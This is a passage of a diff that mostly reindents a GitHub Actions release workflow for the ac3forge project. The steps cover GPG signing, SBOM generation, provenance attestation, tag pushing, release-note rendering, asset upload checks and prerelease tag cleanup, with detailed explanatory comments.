+                     release-artifacts/*.zip release-artifacts/*.exe release-artifacts/*.dmg
+                     release-artifacts/*.AppImage release-artifacts/*.apk)
+          ( cd release-artifacts && sha512sum "${artifacts[@]##release-artifacts/}" > SHA512SUMS )
 
- - name: Import GPG signing key
- if: env.HAVE_GPG_KEY == 'true'
- env:
- GPG_KEY: ${{ secrets.REPO_GPG_PRIVATE_KEY }}
- shell: bash
- run: |
- set -euo pipefail
- echo "$GPG_KEY" | gpg --batch --import
- # REPO_GPG_PRIVATE_KEY is meant to hold exactly one key. If it ever
- # holds more (e.g. a leftover test key alongside the real one),
- # `gpg --list-secret-keys` lists all of them and picking "the
- # first sec: line" silently signs with whichever one gpg happens
- # to list first - not necessarily the intended identity, and with
- # no indication anything was wrong beyond a confusing downstream
- # signing failure if that key needs a passphrase nothing supplied
- # one for. Fail loudly here instead: an ambiguous secret is a
- # secret-provisioning bug to fix (see docs/releasing.md), not
- # something to guess through.
- key_count="$(gpg --list-secret-keys --with-colons | grep -c '^sec:')"
- if [ "$key_count" -ne 1 ]; then
- echo "::error::REPO_GPG_PRIVATE_KEY imported $key_count secret keys, expected exactly 1 - re-export just the intended signing key"
- exit 1
- fi
- echo "GPG_KEYID=$(gpg --list-secret-keys --with-colons | awk -F: '/^sec:/ {print $5; exit}')" >> "$GITHUB_ENV"
- mkdir -p ~/.gnupg
- echo "allow-loopback-pinentry" >> ~/.gnupg/gpg-agent.conf
- gpgconf --kill gpg-agent
+      - name: Import GPG signing key
+        if: env.HAVE_GPG_KEY == 'true'
+        env:
+          GPG_KEY: ${{ secrets.REPO_GPG_PRIVATE_KEY }}
+        shell: bash
+        run: |
+          set -euo pipefail
+          echo "$GPG_KEY" | gpg --batch --import
+          # REPO_GPG_PRIVATE_KEY is meant to hold exactly one key. If it ever
+          # holds more (e.g. a leftover test key alongside the real one),
+          # `gpg --list-secret-keys` lists all of them and picking "the
+          # first sec: line" silently signs with whichever one gpg happens
+          # to list first - not necessarily the intended identity, and with
+          # no indication anything was wrong beyond a confusing downstream
+          # signing failure if that key needs a passphrase nothing supplied
+          # one for. Fail loudly here instead: an ambiguous secret is a
+          # secret-provisioning bug to fix (see docs/releasing.md), not
+          # something to guess through.
+          key_count="$(gpg --list-secret-keys --with-colons | grep -c '^sec:')"
+          if [ "$key_count" -ne 1 ]; then
+            echo "::error::REPO_GPG_PRIVATE_KEY imported $key_count secret keys, expected exactly 1 - re-export just the intended signing key"
+            exit 1
+          fi
+          echo "GPG_KEYID=$(gpg --list-secret-keys --with-colons | awk -F: '/^sec:/ {print $5; exit}')" >> "$GITHUB_ENV"
+          mkdir -p ~/.gnupg
+          echo "allow-loopback-pinentry" >> ~/.gnupg/gpg-agent.conf
+          gpgconf --kill gpg-agent
 
- # Exports the public key so a downloader can verify without trusting
- # GitHub, signs the SHA512SUMS manifest generated above AND each artifact
- # individually (standard release practice - a manifest signature lets
- # you check everything in one step, per-artifact signatures let you
- # verify a single downloaded file without the rest). The passphrase is
- # piped through fd 3, not env/argv, so it never appears in the process
- # list. Self-verifies its own signature before finishing, so a broken
- # key fails this job instead of shipping an unverifiable release.
- - name: GPG-sign release artifacts
- if: env.HAVE_GPG_KEY == 'true'
- env:
- REPO_GPG_PASSPHRASE: ${{ secrets.REPO_GPG_PASSPHRASE }}
- shell: bash
- run: |
- set -euo pipefail
- gpg --armor --export "$GPG_KEYID" > release-artifacts/ac3forge-signing-key.asc
+      # Exports the public key so a downloader can verify without trusting
+      # GitHub, signs the SHA512SUMS manifest generated above AND each artifact
+      # individually (standard release practice - a manifest signature lets
+      # you check everything in one step, per-artifact signatures let you
+      # verify a single downloaded file without the rest). The passphrase is
+      # piped through fd 3, not env/argv, so it never appears in the process
+      # list. Self-verifies its own signature before finishing, so a broken
+      # key fails this job instead of shipping an unverifiable release.
+      - name: GPG-sign release artifacts
+        if: env.HAVE_GPG_KEY == 'true'
+        env:
+          REPO_GPG_PASSPHRASE: ${{ secrets.REPO_GPG_PASSPHRASE }}
+        shell: bash
+        run: |
+          set -euo pipefail
+          gpg --armor --export "$GPG_KEYID" > release-artifacts/ac3forge-signing-key.asc
 
- shopt -s nullglob
- artifacts=(release-artifacts/*.deb release-artifacts/*.rpm release-artifacts/*.tar.gz
- release-artifacts/*.zip release-artifacts/*.exe release-artifacts/*.dmg
- release-artifacts/*.AppImage release-artifacts/*.apk)
+          shopt -s nullglob
+          artifacts=(release-artifacts/*.deb release-artifacts/*.rpm release-artifacts/*.tar.gz
+                     release-artifacts/*.zip release-artifacts/*.exe release-artifacts/*.dmg
+                     release-artifacts/*.AppImage release-artifacts/*.apk)
 
- sign() {
- gpg --batch --yes --pinentry-mode loopback --passphrase-fd 3 --armor \
- --detach-sign "$1" 3<<<"$REPO_GPG_PASSPHRASE"
- }
+          sign() {
+            gpg --batch --yes --pinentry-mode loopback --passphrase-fd 3 --armor \
+                --detach-sign "$1" 3<<<"$REPO_GPG_PASSPHRASE"
+          }
 
- sign release-artifacts/SHA512SUMS
- for f in "${artifacts[@]}"; do
- sign "$f"
- done
+          sign release-artifacts/SHA512SUMS
+          for f in "${artifacts[@]}"; do
+            sign "$f"
+          done
 
- gpg --verify release-artifacts/SHA512SUMS.asc release-artifacts/SHA512SUMS
+          gpg --verify release-artifacts/SHA512SUMS.asc release-artifacts/SHA512SUMS
 
- - name: Generate release SBOM (SPDX)
- uses: anchore/sbom-action@3ad7283483fc7af8ff2b4ea19663c2d5ca935e26 # v0.24.2
- with:
- path: release-artifacts
- format: spdx-json
- output-file: release-artifacts/ac3forge-${{ needs.resolve-version.outputs.version }}.spdx.json
- upload-artifact: false
+      - name: Generate release SBOM (SPDX)
+        uses: anchore/sbom-action@3ad7283483fc7af8ff2b4ea19663c2d5ca935e26 # v0.24.2
+        with:
+          path: release-artifacts
+          format: spdx-json
+          output-file: release-artifacts/ac3forge-${{ needs.resolve-version.outputs.version }}.spdx.json
+          upload-artifact: false
 
- # Keyless: signed via Sigstore/Fulcio using this job's own GitHub OIDC
- # identity (id-token: write above), no private key to manage. This
- # attests WHICH repo/workflow/commit built these bytes; the GPG
- # signature above attests WHO (a human maintainer) vouches for them -
- # complementary, not redundant. Verify with:
- # gh attestation verify <file> --repo iainchesworthlabs/ac3forge
- - name: Attest package build provenance
- uses: actions/attest-build-provenance@4d101475d8b20a2381f78447822ac1eab6504dd8 # v4.2.2
- with:
- subject-path: |
- release-artifacts/*.deb
- release-artifacts/*.rpm
- release-artifacts/*.tar.gz
- release-artifacts/*.zip
- release-artifacts/*.exe
- release-artifacts/*.dmg
- release-artifacts/*.AppImage
- release-artifacts/*.apk
+      # Keyless: signed via Sigstore/Fulcio using this job's own GitHub OIDC
+      # identity (id-token: write above), no private key to manage. This
+      # attests WHICH repo/workflow/commit built these bytes; the GPG
+      # signature above attests WHO (a human maintainer) vouches for them -
+      # complementary, not redundant. Verify with:
+      #   gh attestation verify <file> --repo iainchesworthlabs/ac3forge
+      - name: Attest package build provenance
+        uses: actions/attest-build-provenance@4d101475d8b20a2381f78447822ac1eab6504dd8 # v4.2.2
+        with:
+          subject-path: |
+            release-artifacts/*.deb
+            release-artifacts/*.rpm
+            release-artifacts/*.tar.gz
+            release-artifacts/*.zip
+            release-artifacts/*.exe
+            release-artifacts/*.dmg
+            release-artifacts/*.AppImage
+            release-artifacts/*.apk
 
- # The attestation above is real and independently verifiable
- # (gh attestation verify), but it lives in GitHub's Attestations API,
- # not as a release file - OpenSSF Scorecard's Signed-Releases check
- # (the releasesHaveProvenance probe) has no notion of that API at all;
- # it only ever looks for a release asset named *.intoto.jsonl. This
- # downloads the same attestation just created and republishes it under
- # that name, so both the authoritative verify path and Scorecard's
- # narrower check see it. One temp dir per artifact: the download
- # command always writes to the current directory, named by digest, not
- # by a name we choose.
- - name: Export provenance as .intoto.jsonl release assets
- env:
- GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
- shell: bash
- run: |
- set -euo pipefail
- shopt -s nullglob
- artifacts=(release-artifacts/*.deb release-artifacts/*.rpm release-artifacts/*.tar.gz
- release-artifacts/*.zip release-artifacts/*.exe release-artifacts/*.dmg
- release-artifacts/*.AppImage release-artifacts/*.apk)
- for f in "${artifacts[@]}"; do
- name="$(basename "$f")"
- workdir="$(mktemp -d)"
- ( cd "$workdir" && gh attestation download "$OLDPWD/$f" --repo "${{ github.repository }}" )
- # A glob, not `ls | head -1`: nullglob is set above, so an empty
- # match leaves the array empty and set -u fails the step loudly
- # rather than silently `mv`-ing an empty path.
- bundles=("$workdir"/*.jsonl)
- mv "${bundles[0]}" "release-artifacts/${name}.intoto.jsonl"
- rm -rf "$workdir"
- done
+      # The attestation above is real and independently verifiable
+      # (gh attestation verify), but it lives in GitHub's Attestations API,
+      # not as a release file - OpenSSF Scorecard's Signed-Releases check
+      # (the releasesHaveProvenance probe) has no notion of that API at all;
+      # it only ever looks for a release asset named *.intoto.jsonl. This
+      # downloads the same attestation just created and republishes it under
+      # that name, so both the authoritative verify path and Scorecard's
+      # narrower check see it. One temp dir per artifact: the download
+      # command always writes to the current directory, named by digest, not
+      # by a name we choose.
+      - name: Export provenance as .intoto.jsonl release assets
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        shell: bash
+        run: |
+          set -euo pipefail
+          shopt -s nullglob
+          artifacts=(release-artifacts/*.deb release-artifacts/*.rpm release-artifacts/*.tar.gz
+                     release-artifacts/*.zip release-artifacts/*.exe release-artifacts/*.dmg
+                     release-artifacts/*.AppImage release-artifacts/*.apk)
+          for f in "${artifacts[@]}"; do
+            name="$(basename "$f")"
+            workdir="$(mktemp -d)"
+            ( cd "$workdir" && gh attestation download "$OLDPWD/$f" --repo "${{ github.repository }}" )
+            # A glob, not `ls | head -1`: nullglob is set above, so an empty
+            # match leaves the array empty and set -u fails the step loudly
+            # rather than silently `mv`-ing an empty path.
+            bundles=("$workdir"/*.jsonl)
+            mv "${bundles[0]}" "release-artifacts/${name}.intoto.jsonl"
+            rm -rf "$workdir"
+          done
 
- # actions/attest-sbom is deprecated (GitHub folded it into the generic
- # actions/attest action - confirmed by v0.2.0-beta.1's real run, which
- # showed attest-sbom itself as just a thin wrapper forwarding these
- # same two inputs to actions/attest internally). attest-build-provenance
- # above isn't flagged deprecated, so it's untouched.
- - name: Attest package SBOM
- uses: actions/attest@1e69f48acb82d1966a394da916b4c1698aa569d6 # v4.2.2
- with:
- subject-path: |
- release-artifacts/*.deb
- release-artifacts/*.rpm
- release-artifacts/*.tar.gz
- release-artifacts/*.zip
- release-artifacts/*.exe
- release-artifacts/*.dmg
- release-artifacts/*.AppImage
- release-artifacts/*.apk
- sbom-path: release-artifacts/ac3forge-${{ needs.resolve-version.outputs.version }}.spdx.json
+      # actions/attest-sbom is deprecated (GitHub folded it into the generic
+      # actions/attest action - confirmed by v0.2.0-beta.1's real run, which
+      # showed attest-sbom itself as just a thin wrapper forwarding these
+      # same two inputs to actions/attest internally). attest-build-provenance
+      # above isn't flagged deprecated, so it's untouched.
+      - name: Attest package SBOM
+        uses: actions/attest@1e69f48acb82d1966a394da916b4c1698aa569d6 # v4.2.2
+        with:
+          subject-path: |
+            release-artifacts/*.deb
+            release-artifacts/*.rpm
+            release-artifacts/*.tar.gz
+            release-artifacts/*.zip
+            release-artifacts/*.exe
+            release-artifacts/*.dmg
+            release-artifacts/*.AppImage
+            release-artifacts/*.apk
+          sbom-path: release-artifacts/ac3forge-${{ needs.resolve-version.outputs.version }}.spdx.json
 
- # Only for workflow_dispatch: a tag-push run already has its tag (that
- # is what triggered it). Pushed here, after build/package/sign/attest
- # have all succeeded, so a failed dispatch run leaves no orphaned tag
- # for anything but this step's own failure - which
- # cleanup-failed-prerelease handles for prereleases.
- - name: Push release tag
- if: github.event_name == 'workflow_dispatch'
- env:
- TAG: ${{ needs.resolve-version.outputs.version_tag }}
- GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
- shell: bash
- run: |
- set -euo pipefail
- git config user.name "github-actions[bot]"
- git config user.email "github-actions[bot]@users.noreply.github.com"
- git tag "$TAG"
- git push "https://x-access-token:${GH_TOKEN}@github.com/${{ github.repository }}.git" "$TAG"
+      # Only for workflow_dispatch: a tag-push run already has its tag (that
+      # is what triggered it). Pushed here, after build/package/sign/attest
+      # have all succeeded, so a failed dispatch run leaves no orphaned tag
+      # for anything but this step's own failure - which
+      # cleanup-failed-prerelease handles for prereleases.
+      - name: Push release tag
+        if: github.event_name == 'workflow_dispatch'
+        env:
+          TAG: ${{ needs.resolve-version.outputs.version_tag }}
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        shell: bash
+        run: |
+          set -euo pipefail
+          git config user.name "github-actions[bot]"
+          git config user.email "github-actions[bot]@users.noreply.github.com"
+          git tag "$TAG"
+          git push "https://x-access-token:${GH_TOKEN}@github.com/${{ github.repository }}.git" "$TAG"
 
- # docs/releasing.md's Post-release checklist has always said CHANGELOG.md is the
- # authoritative, human-curated record and the release body should mirror it, not
- # the other way round - `--generate-notes` drafted a commit list instead, which is
- # why curating a second, hand-written body used to be listed as a required (not
- # optional) follow-up step. That curation already happens where it belongs, in
- # CHANGELOG.md, as normal development practice (grouped by user-facing area, bold
- # lead-in bullets - see tools/release/render_release_notes.py's own docstring for
- # what this deliberately does not try to reconstruct on top of that).
- - name: Render release notes from CHANGELOG.md
- env:
- VERSION_TAG: ${{ needs.resolve-version.outputs.version_tag }}
- REPO: ${{ github.repository }}
- shell: bash
- run: |
- set -euo pipefail
- # The FULL version, suffix included - deliberately NOT
- # resolve-version's `version` output. CHANGELOG.md headings carry the
- # prerelease suffix ("## [0.10.0-beta.1]"): every section in that file
- # does, docs/releasing.md says to write them that way, and
- # render_release_notes.py's own docstring gives
- # "## [0.9.0-beta.1] - 2026-08-22" as the shape it searches for. But
- # `version` is bare_version ("${version%%-*}"), which the SBOM filename
- # wants and this does not - passing it here made the renderer look for
- # "## [0.10.0]", find nothing, and hard-fail the release after signing,
- # SBOM and attestation had all succeeded. First hit on v0.10.0-beta.1;
- # latent since the renderer landed in 75772e95, four days after the
- # previous release, so no tag had exercised it before.
- python3 tools/release/render_release_notes.py \
- --version "${VERSION_TAG#v}" --tag "$VERSION_TAG" --repo "$REPO" --output notes.md
+      # docs/releasing.md's Post-release checklist has always said CHANGELOG.md is the
+      # authoritative, human-curated record and the release body should mirror it, not
+      # the other way round - `--generate-notes` drafted a commit list instead, which is
+      # why curating a second, hand-written body used to be listed as a required (not
+      # optional) follow-up step. That curation already happens where it belongs, in
+      # CHANGELOG.md, as normal development practice (grouped by user-facing area, bold
+      # lead-in bullets - see tools/release/render_release_notes.py's own docstring for
+      # what this deliberately does not try to reconstruct on top of that).
+      - name: Render release notes from CHANGELOG.md
+        env:
+          VERSION_TAG: ${{ needs.resolve-version.outputs.version_tag }}
+          REPO: ${{ github.repository }}
+        shell: bash
+        run: |
+          set -euo pipefail
+          # The FULL version, suffix included - deliberately NOT
+          # resolve-version's `version` output. CHANGELOG.md headings carry the
+          # prerelease suffix ("## [0.10.0-beta.1]"): every section in that file
+          # does, docs/releasing.md says to write them that way, and
+          # render_release_notes.py's own docstring gives
+          # "## [0.9.0-beta.1] - 2026-08-22" as the shape it searches for. But
+          # `version` is bare_version ("${version%%-*}"), which the SBOM filename
+          # wants and this does not - passing it here made the renderer look for
+          # "## [0.10.0]", find nothing, and hard-fail the release after signing,
+          # SBOM and attestation had all succeeded. First hit on v0.10.0-beta.1;
+          # latent since the renderer landed in 75772e95, four days after the
+          # previous release, so no tag had exercised it before.
+          python3 tools/release/render_release_notes.py \
+            --version "${VERSION_TAG#v}" --tag "$VERSION_TAG" --repo "$REPO" --output notes.md
 
- - name: Create GitHub Release
- env:
- GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
- VERSION_TAG: ${{ needs.resolve-version.outputs.version_tag }}
- IS_PRERELEASE: ${{ needs.resolve-version.outputs.is_prerelease }}
- shell: bash
- run: |
- set -euo pipefail
- prerelease_flag=""
- if [ "$IS_PRERELEASE" = "true" ]; then
- prerelease_flag="--prerelease"
- fi
- gh release create "$VERSION_TAG" \
- --title "$VERSION_TAG" \
- --notes-file notes.md \
- $prerelease_flag
+      - name: Create GitHub Release
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          VERSION_TAG: ${{ needs.resolve-version.outputs.version_tag }}
+          IS_PRERELEASE: ${{ needs.resolve-version.outputs.is_prerelease }}
+        shell: bash
+        run: |
+          set -euo pipefail
+          prerelease_flag=""
+          if [ "$IS_PRERELEASE" = "true" ]; then
+            prerelease_flag="--prerelease"
+          fi
+          gh release create "$VERSION_TAG" \
+            --title "$VERSION_TAG" \
+            --notes-file notes.md \
+            $prerelease_flag
 
- # Deliberately a separate step from Create GitHub Release, not
- # `gh release create <tag> ... release-artifacts/*` in one call:
- # CountdownSolver's release.yml hit this for real - the combined form
- # silently uploaded only 4 of 9 files, exit 0, no error, nothing to
- # notice until someone went looking for a missing asset. Uploading
- # separately and then verifying the asset count against the file count
- # turns that into a failed job instead of a quietly incomplete release.
- - name: Upload release assets
- env:
- GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
- VERSION_TAG: ${{ needs.resolve-version.outputs.version_tag }}
- shell: bash
- run: |
- set -euo pipefail
- mapfile -t files < <(find release-artifacts -type f)
- echo "Uploading ${#files[@]} file(s):"
- printf ' %s\n' "${files[@]}"
+      # Deliberately a separate step from Create GitHub Release, not
+      # `gh release create <tag> ... release-artifacts/*` in one call:
+      # CountdownSolver's release.yml hit this for real - the combined form
+      # silently uploaded only 4 of 9 files, exit 0, no error, nothing to
+      # notice until someone went looking for a missing asset. Uploading
+      # separately and then verifying the asset count against the file count
+      # turns that into a failed job instead of a quietly incomplete release.
+      - name: Upload release assets
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          VERSION_TAG: ${{ needs.resolve-version.outputs.version_tag }}
+        shell: bash
+        run: |
+          set -euo pipefail
+          mapfile -t files < <(find release-artifacts -type f)
+          echo "Uploading ${#files[@]} file(s):"
+          printf '  %s\n' "${files[@]}"
 
- gh release upload "$VERSION_TAG" "${files[@]}" --clobber
+          gh release upload "$VERSION_TAG" "${files[@]}" --clobber
 
- uploaded=$(gh release view "$VERSION_TAG" --json assets --jq '.assets | length')
- if [ "$uploaded" -ne "${#files[@]}" ]; then
- echo "::error::expected ${#files[@]} release assets, found $uploaded - upload silently dropped some files"
- exit 1
- fi
+          uploaded=$(gh release view "$VERSION_TAG" --json assets --jq '.assets | length')
+          if [ "$uploaded" -ne "${#files[@]}" ]; then
+            echo "::error::expected ${#files[@]} release assets, found $uploaded - upload silently dropped some files"
+            exit 1
+          fi
 
- # Only reachable if github-release ran and failed AFTER pushing the tag
- # (Push release tag succeeded, something later did not) on a dispatched
- # PRERELEASE - a real (non-prerelease) tag is left alone even on failure,
- # since silently deleting a version someone explicitly declared is a
- # bigger surprise than a maintainer having to clean it up by hand. A
- # tag-push trigger never reaches here at all: that tag existed before the
- # workflow started, so this job cannot have been the one that created it.
- cleanup-failed-prerelease:
- name: Clean up orphaned prerelease tag
- needs: [ resolve-version, github-release ]
- if: |
- always() &&
- github.event_name == 'workflow_dispatch' &&
- needs.resolve-version.outputs.is_prerelease == 'true' &&
- needs.resolve-version.outputs.is_dry_run != 'true' &&
- needs.github-release.result == 'failure'
- runs-on: ubuntu-latest
- permissions:
- contents: write
- steps:
- # persist-credentials: false - same reasoning as the github-release job
- # above: "Delete orphaned tag" pushes through its own explicitly-scoped
- # remote instead of a credential left behind by checkout.
- - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
- with:
- persist-credentials: false
+  # Only reachable if github-release ran and failed AFTER pushing the tag
+  # (Push release tag succeeded, something later did not) on a dispatched
+  # PRERELEASE - a real (non-prerelease) tag is left alone even on failure,
+  # since silently deleting a version someone explicitly declared is a
+  # bigger surprise than a maintainer having to clean it up by hand. A
+  # tag-push trigger never reaches here at all: that tag existed before the
+  # workflow started, so this job cannot have been the one that created it.
+  cleanup-failed-prerelease:
+    name: Clean up orphaned prerelease tag
+    needs: [ resolve-version, github-release ]
+    if: |
+      always() &&
+      github.event_name == 'workflow_dispatch' &&
+      needs.resolve-version.outputs.is_prerelease == 'true' &&
+      needs.resolve-version.outputs.is_dry_run != 'true' &&
+      needs.github-release.result == 'failure'
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+    steps:
+      # persist-credentials: false - same reasoning as the github-release job
+      # above: "Delete orphaned tag" pushes through its own explicitly-scoped
+      # remote instead of a credential left behind by checkout.
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+        with:
+          persist-credentials: false
 
- - name: Delete orphaned tag, if it was pushed
- env:
- GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
- TAG: ${{ needs.resolve-version.outputs.version_tag }}
- shell: bash
- run: |
- set -euo pipefail
- remote="https://x-access-token:${GH_TOKEN}@github.com/${{ github.repository }}.git"
- if git ls-remote --exit-code --tags "$remote" "refs/tags/$TAG" >/dev/null 2>&1; then
- echo "Deleting orphaned prerelease tag $TAG"
- git push "$remote" ":refs/tags/$TAG"
- else
- echo "No tag $TAG on origin; nothing to clean up"
- fi
+      - name: Delete orphaned tag, if it was pushed
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          TAG: ${{ needs.resolve-version.outputs.version_tag }}
+        shell: bash
+        run: |
+          set -euo pipefail
+          remote="https://x-access-token:${GH_TOKEN}@github.com/${{ github.repository }}.git"
+          if git ls-remote --exit-code --tags "$remote" "refs/tags/$TAG" >/dev/null 2>&1; then
+            echo "Deleting orphaned prerelease tag $TAG"
+            git push "$remote" ":refs/tags/$TAG"
+          else
+            echo "No tag $TAG on origin; nothing to clean up"
+          fi
 
- # Roadmap DR2. Runs for real (dry_run: false) only once github-release has actually
- # published the release AND uploaded every asset - "Upload release assets" is that
- # job's last step, so by the time this job's `needs` is satisfied the SHA512SUMS,
- # Darwin.dmg and win64.zip assets manifest-bump.yml downloads and cross-checks are
- # all there to find. A failure here never unwinds the release itself: the release is
- # already fully published by this point, and a failed bump just means the packaging
- # manifests still need the manual per-ecosystem steps in docs/releasing.md, same as
- # every release before this automation existed.
- manifest-bump:
- name: Bump packaging manifests
- needs: [ resolve-version, github-release ]
- if: needs.resolve-version.outputs.is_dry_run != 'true'
- permissions:
- contents: write
- pull-requests: write
- uses: ./.github/workflows/manifest-bump.yml
- with:
- version_tag: ${{ needs.resolve-version.outputs.version_tag }}
- dry_run: false
- secrets:
- HOMEBREW_TAP_TOKEN: ${{ secrets.HOMEBREW_TAP_TOKEN }}
+  # manifest bump automation. Runs for real (dry_run: false) only once github-release has actually
+  # published the release AND uploaded every asset - "Upload release assets" is that
+  # job's last step, so by the time this job's `needs` is satisfied the SHA512SUMS,
+  # Darwin.dmg and win64.zip assets manifest-bump.yml downloads and cross-checks are
+  # all there to find. A failure here never unwinds the release itself: the release is
+  # already fully published by this point, and a failed bump just means the packaging
+  # manifests still need the manual per-ecosystem steps in docs/releasing.md, same as
+  # every release before this automation existed.
+  manifest-bump:
+    name: Bump packaging manifests
+    needs: [ resolve-version, github-release ]
+    if: needs.resolve-version.outputs.is_dry_run != 'true'
+    permissions:
+      contents: write
+      pull-requests: write
+    uses: ./.github/workflows/manifest-bump.yml
+    with:
+      version_tag: ${{ needs.resolve-version.outputs.version_tag }}
+      dry_run: false
+    secrets:
+      HOMEBREW_TAP_TOKEN: ${{ secrets.HOMEBREW_TAP_TOKEN }}
